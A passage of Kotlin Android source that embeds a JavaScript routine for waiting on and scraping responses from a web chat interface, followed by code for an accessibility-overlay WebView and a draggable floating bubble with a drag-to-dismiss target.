                    Cortex.saveAutomationResult(allResults.join('\n\n================================\n\n'));
                    
                    function waitForGen() {
                        return new Promise(resolve => {
                            let lastLen = 0;
                            let stable = 0;
                            let ival = setInterval(() => {
                                // Sniff for Errors First
                                let errBanner = document.querySelector('ms-banner .error-banner-message');
                                let turnErr = document.querySelector('.chat-turn-container.model:last-of-type .model-error');
                                let toast = document.querySelector('.cdk-overlay-container .mat-mdc-simple-snack-bar');
                                let errTxt = (errBanner ? errBanner.innerText : "") + (turnErr ? turnErr.innerText : "") + (toast ? toast.innerText : "");
                                
                                if (errTxt) {
                                    clearInterval(ival);
                                    if (errTxt.toLowerCase().includes('quota') || errTxt.toLowerCase().includes('exhausted')) {
                                        resolve({status: 'QUOTA', text: errTxt});
                                    } else {
                                        let dismissBtn = errBanner ? errBanner.parentElement.querySelector('.dismiss') : null;
                                        if (dismissBtn) dismissBtn.click(); // Clear the banner so we can see the next one if it fails again
                                        resolve({status: 'ERROR', text: errTxt});
                                    }
                                    return;
                                }
                                
                                // Sniff for Streaming State
                                let spinner = document.querySelector('ms-run-button .stoppable-spinner');
                                if (!spinner) {
                                    let models = document.querySelectorAll('.chat-turn-container.model');
                                    if (models.length > 0) {
                                        let latest = models[models.length - 1];
                                        let textArr = Array.from(latest.querySelectorAll('ms-text-chunk p, ms-text-chunk span')).map(p => p.innerText);
                                        let cText = textArr.join('\n');
                                        let cLen = cText.length;
                                        
                                        if (cLen > 0 && cLen === lastLen) {
                                            stable++;
                                        } else {
                                            stable = 0;
                                            lastLen = cLen;
                                        }
                                        
                                        if (stable >= 3) {
                                            clearInterval(ival);
                                            resolve({status: 'SUCCESS', text: cText});
                                        }
                                    }
                                }
                            }, 500);
                        });
                    }
                    
                } catch (e) {
                    Cortex.log("[AUTO_ERR] Master Exception: " + e.toString());
                }
            })();
        """.trimIndent()
    }

    fun warmUpEngine(ctx: Context) {
        Handler(Looper.getMainLooper()).post {
            val service = MyAccessibilityService.instance ?: return@post
            if (overlayView == null) {
                DebugLogger.log("SDUI_VERBOSE", "Pre-warming WebView engine in background...")
                try {
                    overlayView = WebView(service).apply {
                        setBackgroundColor(Color.TRANSPARENT)
                        settings.javaScriptEnabled = true
                        settings.domStorageEnabled = true
                        settings.allowFileAccess = true
                        settings.allowContentAccess = true
                        webViewClient = object : WebViewClient() {
                            override fun onRenderProcessGone(view: WebView?, detail: android.webkit.RenderProcessGoneDetail?): Boolean {
                                DebugLogger.log("SDUI_ERR", "Warm WebView Renderer died! Purging.")
                                view?.destroy()
                                if (overlayView == view) { overlayView = null; isAttached = false }
                                return true
                            }
                        }
                        addJavascriptInterface(CortexBridge(ctx), "Cortex")
                        loadUrl("about:blank")
                    }
                    currentType = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
                    isAttached = false
                    DebugLogger.log("SDUI_VERBOSE", "WebView engine pre-warmed successfully.")
                } catch (e: Exception) {
                    DebugLogger.log("SDUI_ERR", "Pre-warm failed: ${e.message}")
                }
            }
        }
    }

        private var floatingBubbleView: android.view.View? = null
    private var isBubbleAttached = false
    private var trashCanView: android.view.View? = null
    private var isTrashAttached = false

    private fun showTrashCan(ctx: android.content.Context, density: Float, targetType: Int) {
        if (isTrashAttached && trashCanView != null) return
        val wm = ctx.getSystemService(android.content.Context.WINDOW_SERVICE) as android.view.WindowManager
        val trashSizePx = (72 * density).toInt()

        val trash = android.widget.FrameLayout(ctx).apply {
            val gd = android.graphics.drawable.GradientDrawable().apply {
                shape = android.graphics.drawable.GradientDrawable.OVAL
                setColor(android.graphics.Color.parseColor("#80FF003C")) // Semi-transparent red
                setStroke((2 * density).toInt(), android.graphics.Color.WHITE)
            }
            background = gd

            val text = android.widget.TextView(ctx).apply {
                text = "✕"
                setTextColor(android.graphics.Color.WHITE)
                textSize = 24f
                gravity = android.view.Gravity.CENTER
            }
            addView(text, android.widget.FrameLayout.LayoutParams(
                android.widget.FrameLayout.LayoutParams.MATCH_PARENT,
                android.widget.FrameLayout.LayoutParams.MATCH_PARENT
            ))
        }

        val trashParams = android.view.WindowManager.LayoutParams(
            trashSizePx, trashSizePx,
            targetType,
            android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
            android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            android.graphics.PixelFormat.TRANSLUCENT
        ).apply {
            gravity = android.view.Gravity.BOTTOM or android.view.Gravity.CENTER_HORIZONTAL
            y = (48 * density).toInt() // 48dp from bottom
        }

        try {
            wm.addView(trash, trashParams)
            trashCanView = trash
            isTrashAttached = true
        } catch (e: Exception) {
            DebugLogger.log("TRASH_ERR", "Failed to deploy: ${e.message}")
        }
    }

    private fun removeTrashCan(ctx: android.content.Context) {
        val wm = ctx.getSystemService(android.content.Context.WINDOW_SERVICE) as android.view.WindowManager
        if (isTrashAttached && trashCanView != null) {
            try {
                wm.removeView(trashCanView)
            } catch (e: Exception) {}
            trashCanView = null
            isTrashAttached = false
        } 
    }

    fun showFloatingBubble(ctx: android.content.Context) {
        android.os.Handler(android.os.Looper.getMainLooper()).post {
            val service = MyAccessibilityService.instance
            val windowContext = service ?: ctx
            val wm = windowContext.getSystemService(android.content.Context.WINDOW_SERVICE) as android.view.WindowManager
            val targetType = if (service != null) android.view.WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY else android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY

            if (isBubbleAttached && floatingBubbleView != null) return@post

            val density = windowContext.resources.displayMetrics.density
            val sizePx = (52 * density).toInt()

            val bubble = android.widget.FrameLayout(windowContext).apply {
                val gd = android.graphics.drawable.GradientDrawable().apply {
                    shape = android.graphics.drawable.GradientDrawable.OVAL
                    setColor(android.graphics.Color.parseColor("#E6007AFF")) // 90% opacity Samsung Blue
                    setStroke((2 * density).toInt(), android.graphics.Color.WHITE)
                }
                background = gd
                
                val inner = android.view.View(windowContext).apply {
                    val igd = android.graphics.drawable.GradientDrawable().apply {
                        shape = android.graphics.drawable.GradientDrawable.OVAL
                        setColor(android.graphics.Color.WHITE)
                    }
                    background = igd
                }
                val innerSize = (14 * density).toInt()
                val innerParams = android.widget.FrameLayout.LayoutParams(innerSize, innerSize).apply {
                    gravity = android.view.Gravity.CENTER
                }
                addView(inner, innerParams)
            }

            val params = android.view.WindowManager.LayoutParams(
                sizePx, sizePx,
                targetType,
                android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                android.graphics.PixelFormat.TRANSLUCENT
            ).apply {
                gravity = android.view.Gravity.TOP or android.view.Gravity.START
                x = (windowContext.resources.displayMetrics.widthPixels - sizePx - (16 * density).toInt())
                y = (windowContext.resources.displayMetrics.heightPixels / 2)
            }

            bubble.setOnTouchListener(object : android.view.View.OnTouchListener {
                private var initialX = 0
                private var initialY = 0
                private var initialTouchX = 0f
                private var initialTouchY = 0f
                private var clickThreshold = 5 * density
                private var isOverTrash = false

                override fun onTouch(v: android.view.View, event: android.view.MotionEvent): Boolean {
                    val displayMetrics = windowContext.resources.displayMetrics
                    val screenWidth = displayMetrics.widthPixels
                    val screenHeight = displayMetrics.heightPixels

                    val trashSizePx = (72 * density).toInt()
                    val trashYOffset = (48 * density).toInt()
                    val trashCenterX = screenWidth / 2f
                    val trashCenterY = screenHeight - trashYOffset - (trashSizePx / 2f)

                    when (event.action) {
                        android.view.MotionEvent.ACTION_DOWN -> {
                            initialX = params.x
                            initialY = params.y
                            initialTouchX = event.rawX
                            initialTouchY = event.rawY
                            isOverTrash = false
                            showTrashCan(windowContext, density, targetType)
                            return true
                        }
                        android.view.MotionEvent.ACTION_MOVE -> {
                            val rawNewX = initialX + (event.rawX - initialTouchX).toInt()
                            val rawNewY = initialY + (event.rawY - initialTouchY).toInt()

                            // Clamp values inside screen boundaries
                            params.x = rawNewX.coerceIn(0, screenWidth - sizePx)
                            params.y = rawNewY.coerceIn(0, screenHeight - sizePx)

                            // Check collision with Trash Can
                            val bubbleCenterX = params.x + (sizePx / 2f)
                            val bubbleCenterY = params.y + (sizePx / 2f)
                            val dx = bubbleCenterX - trashCenterX
                            val dy = bubbleCenterY - trashCenterY
                            val distance = Math.sqrt((dx * dx + dy * dy).toDouble())

                            val overThreshold = (trashSizePx + sizePx) * 0.6f
                            if (distance < overThreshold) {
                                if (!isOverTrash) {
                                    isOverTrash = true
                                    // Visual feedback: solid bright red background & slight scaling
                                    trashCanView?.let { tc ->
                                        val gd = android.graphics.drawable.GradientDrawable().apply {
                                            shape = android.graphics.drawable.GradientDrawable.OVAL
                                            setColor(android.graphics.Color.parseColor("#E6FF003C"))
                                            setStroke((3 * density).toInt(), android.graphics.Color.WHITE)
                                        }
                                        tc.background = gd
                                        tc.animate().scaleX(1.15f).scaleY(1.15f).setDuration(100).start()
                                    }
                                }
                            } else {
                                if (isOverTrash) {
                                    isOverTrash = false
                                    // Visual feedback: restore transparent red
                                    trashCanView?.let { tc ->
                                        val gd = android.graphics.drawable.GradientDrawable().apply {
                                            shape = android.graphics.drawable.GradientDrawable.OVAL
                                            setColor(android.graphics.Color.parseColor("#80FF003C"))
                                            setStroke((2 * density).toInt(), android.graphics.Color.WHITE)
                                        }
                                        tc.background = gd
                                        tc.animate().scaleX(1.0f).scaleY(1.0f).setDuration(100).start()
                                    }
                                }
                            }

                            try { wm.updateViewLayout(bubble, params) } catch (e: Exception) {}
                            return true
                        }
                        android.view.MotionEvent.ACTION_UP -> {
                            removeTrashCan(windowContext)
                            if (isOverTrash) {
                                // Close and disconnect session
                                windowContext.sendBroadcast(android.content.Intent("com.cortex.agent.DISCONNECT"))
                            } else {
                                val diffX = Math.abs(event.rawX - initialTouchX)
                                val diffY = Math.abs(event.rawY - initialTouchY)
                                if (diffX < clickThreshold && diffY < clickThreshold) {
                                    windowContext.sendBroadcast(android.content.Intent("com.cortex.agent.RESUME"))
                                } 
                            }
                            return true
                        }
                    } 
                    return false
                }
            })

            try {
                wm.addView(bubble, params)
                floatingBubbleView = bubble
                isBubbleAttached = true
                DebugLogger.log("BUBBLE", "Floating action bubble deployed.")
            } catch(e: Exception) {
                DebugLogger.log("BUBBLE_ERR", "Failed to deploy: ${e.message}")
            }
        }
    }

    fun removeFloatingBubble(ctx: android.content.Context) {
        android.os.Handler(android.os.Looper.getMainLooper()).post {
            val windowContext = MyAccessibilityService.instance ?: ctx
            removeTrashCan(windowContext)
            val wm = windowContext.getSystemService(android.content.Context.WINDOW_SERVICE) as android.view.WindowManager
            floatingBubbleView?.let {
                if (isBubbleAttached) {
                    try {
                        wm.removeView(it)
                        DebugLogger.log("BUBBLE", "Floating action bubble removed.")
                    } catch (e: Exception) {}
                }
                floatingBubbleView = null
                isBubbleAttached = false
            }
        }
    }
}
